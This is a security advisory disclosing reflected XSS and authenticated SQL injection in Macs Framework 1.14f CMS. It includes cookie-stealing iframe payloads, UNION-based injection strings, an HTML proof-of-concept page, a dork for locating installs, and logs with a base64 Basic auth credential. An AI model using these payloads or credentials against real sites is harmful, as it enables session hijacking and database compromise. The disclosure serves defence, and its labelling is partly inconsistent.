@@ -1,0 +1,482 @@
+# Title: Macs Framework 1.14f CMS - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Software Link: https://sourceforge.net/projects/macs-framework/files/latest/download
+# CVE: N/A
+
+Document Title:
+===============
+Macs Framework v1.14f CMS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2206
+
+
+Release Date:
+=============
+2020-04-14
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2206
+
+
+Common Vulnerability Scoring System:
+====================================
+7.4
+
+
+Vulnerability Class:
+====================
+Multiple
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Macs CMS is a Flat File (XML and SQLite) based AJAX Content Management
+System. It focuses mainly on the
+Edit In Place editing concept. It comes with a built in blog with
+moderation support, user manager section,
+roles manager section, SEO / SEF URL.
+https://sourceforge.net/projects/macs-framework/files/latest/download
+
+(Copy of the Homepage: https://sourceforge.net/projects/macs-framework/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple web
+vulnerabilities in the official Macs Framework v1.1.4f CMS.
+
+
+Affected Product(s):
+====================
+Macrob7
+Product: Macs Framework v1.14f - Content Management System
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-14: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Restricted authentication (user/moderator) - User privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+1.1 & 1.2
+Multiple non-persistent cross site scripting web vulnerabilities has
+been discovered in the official Mac Framework v1.1.4f Content Managament
+System.
+The vulnerability allows remote attackers to manipulate client-side
+browser to web-applicatio requests to compromise user sesson credentials
+or to
+manipulate module content.
+
+The first vulnerability is located in the search input field of the
+search module. Remote attackers are able to inject own malicious script
+code as
+search entry to execute the code within the results page that is loaded
+shortly after the request is performed. The request method to inject is
+POST
+and the attack vector is located on the client-side with non-persistent
+attack vector.
+
+The second vulnerability is located in the email input field of the
+account reset function. Remote attackers are able to inject own
+malicious script code as
+email to reset the passwort to execute the code within performed
+request. The request method to inject is POST and the attack vector is
+located on the
+client-side with non-persistent attack vector.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, non-persistent phishing attacks, non-persistent external
+redirects to
+malicious source and non-persistent manipulation of affected or
+connected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Parameter(s):
+[+] searchString
+[+] emailAdress
+
+
+1.3
+Multiple remote sql-injection web vulnerabilities has been discovered in
+the official Mac Framework v1.1.4f Content Managament System.
+The vulnerability allows remote attackers to inject or execute own sql
+commands to compromise the dbms or file system of the application.
+
+The sql injection vulnerabilities are located in the `roleId` and
+`userId` of the `editRole` and `deletUser` module. The request method to
+inject or execute commands is GET and the attack vector is located on
+the application-side. Attackers with privileged accounts to edit are
+able to inject own sql queries via roleid and userid on deleteUser or
+editRole. Multiple unhandled and broken sql queries are visible as default
+debug to output for users as well.
+
+Exploitation of the remote sql injection vulnerability requires no user
+interaction and a privileged web-application user account.
+Successful exploitation of the remote sql injection results in database
+management system, web-server and web-application compromise.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] deleteUser
+[+] editRole
+
+Vulnerable Parameter(s):
+[+] userId
+[+] roleId
+
+
+Proof of Concept (PoC):
+=======================
+Google Dork(s): intitle, subtitle & co.
+Site Powered by Mac's PHP MVC Framework Framework of the future
+Design downloaded from Zeroweb.org: Free website templates, layouts, and
+tools.
+
+
+1.1
+The non-persistent cross site scripting web vulnerability can be
+exploited by remote attackers without user account and with low user
+interaction.
+For security demonstration or to reproduce the cross site scripting web
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Payload
+>">"<iframe src=evil.source
+onload=alert(document.cookie)>&scrollPosition=0&scrollPosition=0
+
+
+PoC: Vulnerable Source
+<form method="post"
+action="https://macs-cms.localhost:8080/index.php/search" id="searchForm">
+<span class="searchLabel">Search Site:</span><input type="searchString"
+value="" name="searchString" class="searchString">
+<input type="submit" value="Search" class="searchSubmit">
+</form><br>
+<span class="error">No Results found for: "<iframe src="evil.source"
+onload="alert(document.cookie)"></span>
+
+
+--- PoC Session Logs [POST] ---
+https://macs-cms.localhost:8080/index.php/search
+Host: macs-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Origin: https://macs-cms.localhost:8080
+Authorization: Basic dGVzdGVyMjM6Y2hhb3M2NjYhISE=
+Connection: keep-alive
+Referer: https://macs-cms.localhost:8080/index.php
+Cookie: PHPSESSID=h81eeq4jucus8p9qp146pjn652;
+Upgrade-Insecure-Requests: 1
+searchString=>">"<iframe src=evil.source
+onload=alert(document.cookie)>&scrollPosition=0&scrollPosition=0
+-
+POST: HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Powered-By-Plesk: PleskWin
+Content-Length: 9865
+
+
+1.2
+The non-persistent cross site scripting web vulnerability can be
+exploited by remote attackers without user account and with low user
+interaction.
+For security demonstration or to reproduce the cross site scripting web
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Exploitation
+test"<iframe src=evil.source onload=alert(document.cookie)>@gmail.com
+
+
+PoC: Vulnerable Source
+<form method="post"
+action="https://macs-cms.localhost:8080/index.php/main/cms/login"
+class="ajax" ajaxoutput="#loginMessage">
+  <table style="width:100%">
+    <tbody><tr>
+      <td style="width: 20px">Username:</td>
+      <td><input type="text" name="username"></td>
+    </tr>
+    <tr>
+      <td>Password:</td>
+      <td><input type="password" name="password"></td>
+    </tr>
+    <tr>
+      <td colspan="2"><input type="submit" value="Login"></td>
+    </tr>
+    <tr>
+      <td colspan="2"><br><div id="loginMessage" style="display:
+block;">Invalid Username or Password</div></td>
+    </tr>
+  </tbody></table>
+  <br>
+  <a
+href="https://macs-cms.localhost:8080/index.php/main/cms/forgotPassword"
+class="ajax" ajaxoutput="#forgotPassword">Forgot Password</a>
+<input type="hidden" name="scrollPosition" value="102"></form>
+<div id="forgotPassword" style="display: block;">
+<form class="ajax" method="post"
+action="https://macs-cms.localhost:8080/index.php/main/cms/forgotPasswordProcess"
+ajaxoutput="#forgotPasswordReturn">
+  Enter your email address: <input type="text" name="emailAddress"><br>
+  <input type="submit" value="Send Email">
+</form>
+<br>
+<div id="forgotPasswordReturn" style="display: block;">Cannot find user
+with Email address:
+test"<iframe src=evil.source
+onload=alert(document.cookie)>@gmail.com</iframe></div>
+</div>
+
+
+
+--- PoC Session Logs [POST] ---
+https://macs-cms.localhost:8080/index.php/main/cms/forgotPassword
+Host: macs-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 17
+Origin: https://macs-cms.localhost:8080
+Connection: keep-alive
+Referer: https://macs-cms.localhost:8080/index.php/main/cms/login
+Cookie: PHPSESSID=h81eeq4jucus8p9qp146pjn652;
+ajaxRequest=true
+-
+POST: HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=ISO-8859-1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Powered-By-Plesk: PleskWin
+Content-Length: 335
+-
+https://macs-cms.localhost:8080/index.php/main/cms/forgotPasswordProcess
+Host: macs-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 123
+Origin: https://macs-cms.localhost:8080
+Connection: keep-alive
+Referer: https://macs-cms.localhost:8080/index.php/main/cms/login
+Cookie: PHPSESSID=h81eeq4jucus8p9qp146pjn652;
+ajaxRequest=true&=&emailAddress=test"<iframe src=evil.source
+onload=alert(document.cookie)>@gmail.com
+-
+POST: HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=ISO-8859-1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Powered-By-Plesk: PleskWin
+Content-Length: 105
+
+
+1.3
+The remote sql injection web vulnerability can be exploited by remote
+attackers with privileged application user account and without user
+interaction.
+For security demonstration or to reproduce the cross site scripting web
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Payload
+%27-1%20order%20by%205--
+%27-1%20union select 1,2,3,4,@@version--
+
+
+PoC: Exploitation
+<html>
+<head><body><title>Mac's CMS SQL Injection PoC</title>
+<iframe
+src=https://macs-cms.localhost:8080/index.php/main/cms/editRole?roleId=%27-1%20order%20by%205--%20>
+<iframe
+src=https://macs-cms.localhost:8080/index.php/main/cms/editRole?roleId=%27-1%20union
+select 1,2,3,4,@@version--%20>
+<iframe
+src=https://macs-cms.localhost:8080/index.php/main/cms/deleteUser?userId=%27-1%20order%20by%205--%20>
+<iframe
+src=https://macs-cms.localhost:8080/index.php/main/cms/deleteUser?userId=%27-1%20union
+select 1,2,3,4,@@version--%20>
+</body></head>
+</html>
+
+
+--- PoC Session Logs [GET] ---
+https://macs-cms.localhost:8080/index.php/main/cms/editRole?roleId='-1
+order by 5--
+Host: macs-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: __utma=72517782.1164807459.1586620290.1586620290.1586620290.1;
+Upgrade-Insecure-Requests: 1
+-
+GET: HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Powered-By-Plesk: PleskWin
+Content-Length: 53
+
+
+--- [SQL Error Exception Logs] ---
+SQLSTATE[HY000]: General error: 1 near "1": syntax error
+-
+Error executing SQL statement
+SQLSTATE[HY000]: General error: 1 unrecognized token: "''';"
+-
+Error executing SQL statement
+SQLSTATE[HY000]: General error: 1 1st ORDER BY term out of range -
+should be between 1 and 5
+-
+5.0.12 'pwnd
+This page was created in 1.5665068626404 seconds
+
+
+Security Risk:
+==============
+1.1 & 1.2
+the security risk of the client-side cross site scripting web
+vulnerabilities in the search and email reset function are estimated as
+medium.
+
+1.3
+The security risk of the remote sql injection web vulnerabilities in the
+id parameters on delete are estimated as high.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
